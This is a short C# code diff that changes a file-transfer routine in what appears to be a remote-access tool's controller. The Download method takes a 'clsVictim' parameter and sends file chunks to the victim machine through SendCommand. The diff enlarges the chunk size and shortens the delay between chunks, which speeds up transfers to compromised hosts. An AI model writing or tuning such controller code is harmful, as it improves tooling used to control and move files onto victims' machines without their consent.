@@ -291,7 +291,7 @@ namespace winClient48
         }
         public void Download(string[] files, clsVictim v)
         {
-            int chunk_size = 1024 * 3;
+            int chunk_size = 1024 * 10;
             byte[] file_buffer = new byte[chunk_size];
 
             g_bDownloadPause = false;
@@ -344,7 +344,7 @@ namespace winClient48
                         v.SendCommand(szPayload);
                         i++;
 
-                        Thread.Sleep(100);
+                        Thread.Sleep(10);
                     }
                 }
             }
